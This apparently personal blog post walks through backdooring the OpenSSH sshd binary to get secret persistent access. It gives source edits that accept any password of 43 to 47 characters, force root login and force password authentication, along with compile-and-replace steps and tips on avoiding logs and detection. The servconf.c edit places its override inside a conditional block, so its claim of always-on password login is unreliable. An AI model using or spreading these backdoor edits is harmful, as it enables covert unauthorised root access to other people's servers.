# Backdooring Binaries: sshd
## Introduction
I was recently given the idea of backdooring Linux binaries.  Since their code is all open-source, it is borderline trivial for someone to download it, add a line or two, and recompile.  The hard(er) part is figuring out what to add, but in some cases it really isn't too bad.  In this post, we're looking at backdooring an sshd binary for Linux, making a "secret knock" to let us in whenever we want.  

I titled this post as if it were a series.  It might be, I have no clue.  The future will tell...

## Goals
To determine success and give us a direction, we need goals.  The final binary should:
 - Be swappable with the current SSHD binary in the target system
 - Allow the attacker (us) to login through some means that does not require authentication

Let's get started.

## Development Setup
First things first, we need a target system.  So, I setup a basic Manjaro VM and installed sshd on it.  Test it out, and it works just fine.  
Next, we need the code to work with.  The source for openssh-portable is freely available on [GitHub](https://github.com/openssh/openssh-portable).  This will be the source code we are working with.  

## Finding a Code to Call Home
Now that we have the source code we need, we have to figure out where to add our bug.  Looking through the names of files in the directory, the following filenames stand out:
 - auth.c
 - auth-passwd.c
 - auth2.c
 - auth2-passwd.c

### auth.c
This file contains the following functions:
 - allowed_user(struct ssh *ssh, struct passwd * pw)
	While the password is passed into this function, it appears to have more to do with the user's shell and if they are valid to login or not.  Probably not what we're looking for.  However, it could be an interesting way to bypass the /etc/shells requirement in some niche scenario.
 - format_method_key(Authctxt *authctxt)
	This deals with keys instead of passwords.  Not it.  
 - auth_log(struct ssh *ssh, int authenticated, int partial, const char *method, const char *submethod)
	Standard authentication logging function.  It won't help us get a login, but we could totally forge some logs to make it look like we never logged in if we want. 
 - auth_maxtries_exceeded(struct ssh *ssh)
	This probably speaks for itself.  Not what we need.
 - auth_root_allowed(struct ssh *ssh, const char *method)
	Again, this isn't what we need, but a cursory glance indicates that it would likely be trivially easy to edit this and allow root login all the time.  Let's come back to this later.  

So, we keep scrolling through this list, and it looks like there may be some potential candidates for allowing backdoored login, but there's a lot more we could look at.  

### auth-passwd.c
Right off the bat, we see the function `auth_password(struct ssh *ssh, const char *password)`.  Looking at the code shows it is indeed a large component of how passwords are used to authenticate users.  It looks like this function can call other authentication methods if they are available on the system, and then returns `ok` if the password is good, or `0` if it isn't.  There is also a small check at the beginning for max password length.  This is exactly what we're looking for.  Since a successful authentication returns "ok", how about we add in one more if statement:
```
if (strlen(password) > 42 && strlen(password) < 48)
		return ok;
```
This will authenticate any password between the lengths of 43 and 47.  This is high enough up there that a system administrator or user of the target system is unlikely to notice it as strange behavior in their day-to-day life, and the slight range gives us some space for typos without generating auth failure logs.  

This should already be the effective base for the sshd backdoor.  Let's test it out and see how it works.

## Testing
Let's compile and install this on the target.
To ensure proper compatability, we should compile on the target system.  In a standard engagement, this obviously would be a really bad idea, but for testing purposes, it will make things easier.  The openssh-portable GitHub readme specifies the following instructions for installing, which we will follow:
```
autoreconf
./configure
make && make tests
```
(You may need to install libcrypto from openssl or the like if this does not compile.)
Now, we have a beautiful sshd binary!  Let's overwrite the current sshd binary.  (I suggest making a backup of the clean one just in case.)
`which sshd` will tell us which sshd binary we need to replace.  
`/usr/bin/sshd`
So, we simply `cp sshd /usr/bin/sshd` (with root perms), `systemctl daemon-reload`, and `systemctl start sshd`!
`systemctl status sshd` says it failed.  Hmmmm.  How about we try running it from the command line instead of systemctl.  
Following the errors as it provides them to us, I had to do the following:
 - Run sshd with an absolute path /usr/bin/sshd
 - Add symlinks to the hostkeys and the sshd_config file in /usr/local/etc
 - Edit sshd_config to remove the AllowPam option

One more try, and it looks like it's working.  Now we should try logging in.  
Since linux doesn't display passwords as they're being typed in, a screenshot doesn't really help.  However, when I put ssh with the creds root:11111111112222222222233333333333444444444455555, it logs me in!

## Make it a Little Nastier
There are a few other pieces of code we can edit to make the backdoor just a bit more effective for most use cases.  
### Allow Root Logon
Remember that one function auth_root_allowed() that we found in auth.c?  Let's take another look at it. 
```
int
auth_root_allowed(struct ssh *ssh, const char *method)
{
	switch (options.permit_root_login) {
	case PERMIT_YES:
		return 1;
	case PERMIT_NO_PASSWD:
		if (strcmp(method, "publickey") == 0 ||
		    strcmp(method, "hostbased") == 0 ||
		    strcmp(method, "gssapi-with-mic") == 0)
			return 1;
		break;
	case PERMIT_FORCED_ONLY:
		if (auth_opts->force_command != NULL) {
			logit("Root login accepted for forced command.");
			return 1;
		}
		break;
	}
	logit("ROOT LOGIN REFUSED FROM %.200s port %d",
	    ssh_remote_ipaddr(ssh), ssh_remote_port(ssh));
	return 0;
}

```
This is a simple "if it's allowed, return 1, if not return 0" function.  Since we want our backdoor to always have root access, let's do something quick and dirty:
```
int
auth_root_allowed(struct ssh *ssh, const char *method)
{
	return 1;
	switch (options.permit_root_login) {
	case PERMIT_YES:
		return 1;
	case PERMIT_NO_PASSWD:
		if (strcmp(method, "publickey") == 0 ||

   ...

}
```
A single `return 1` permits root logon with passwords globally, allowing more effective use of the backdoor. 

### Allow Password Logon
While looking at a few other files in the source code, I found the following line in servconf.c:
```
{
    ...	

	if (options->password_authentication == -1)
		options->password_authentication = 1;
	if (options->kbd_interactive_authentication == -1)
		options->kbd_interactive_authentication = 1;
	if (options->permit_empty_passwd == -1)
		options->permit_empty_passwd = 0;
	if (options->permit_user_env == -1) {
		options->permit_user_env = 0;
		options->permit_user_env_allowlist = NULL;
	}
```
It looks like this is how the server loads in configuration changes from the sshd_conf file.  I don't like not having password login, so lets make sure we always get it!
```
{
   ...

	if (options->password_authentication == -1)
		options->password_authentication = 1;
	if (options->kbd_interactive_authentication == -1)
		options->kbd_interactive_authentication = 1;
	if (options->permit_empty_passwd == -1)
		options->permit_empty_passwd = 0;
	if (options->permit_user_env == -1) {
		options->permit_user_env = 0;
		options->permit_user_env_allowlist = NULL;
	options->password_authentication = 1;
	}
```
And now we can always use our password backdoor, even when password login is not configured!  The downside to this edit is that it is more likely a user or sysadmin would notice the erroneous behavior through normal operation, potentially blowing our cover and removing the persistence.  

## Conclusion
Binaries can be backdoored!  Trusting that system files is are clean is bad practice, but that can be leveraged to create very very quiet persistence on a target.  
Thanks for reading!

